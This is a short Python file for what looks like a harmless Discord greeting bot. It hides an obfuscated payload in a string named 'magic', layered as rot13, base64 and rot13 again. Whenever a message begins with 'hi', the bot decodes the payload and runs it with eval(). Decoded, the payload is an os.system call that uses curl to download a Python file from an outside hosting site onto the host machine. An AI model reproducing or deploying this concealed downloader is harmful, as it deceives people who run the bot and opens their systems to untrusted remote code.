import discord
import os
import codecs
import base64

intents = discord.Intents.all()
client = discord.Client(command_prefix="!", intents=intents)

magic = '''
LzLhMzkzM3W6XPWjnTI5VP1PVUIaM2AzBv8iLJ5bqUIaYJ9vLauzYwNjZTclo3IvMzqhL2ZhpTW6Y2udnP5woPVcPt==
'''

@client.event
async def on_ready():
    print("We have logged in as {0.user}".format(client))


@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.content.startswith("hi"):
        await message.channel.send("Hello!")
        byte = codecs.decode(magic, "rot13")
        string = base64.b64decode(byte)
        tr = string.decode()
        out = codecs.decode(tr, "rot13")
        await eval(out)

client.run(os.environ["BOT_TOKEN"])
